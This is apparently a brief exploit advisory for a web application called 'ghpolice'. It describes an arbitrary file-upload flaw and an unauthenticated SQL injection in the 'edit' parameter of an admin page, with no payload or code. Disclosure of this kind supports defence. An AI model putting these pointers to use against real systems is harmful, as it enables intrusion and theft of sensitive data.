# Exploit Description:
The application is prone to an arbitrary file-upload because it fails to adequately sanitize user-supplied input. An attacker can exploit these issues to upload arbitrary files in the context of the web server process and execute commands.

The application suffers from an unauthenticated SQL Injection vulnerability.Input passed through 'edit' GET parameter in 'http://127.0.0.1//ghpolice/admin/investigation.php' is not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code and retrieve sensitive data.
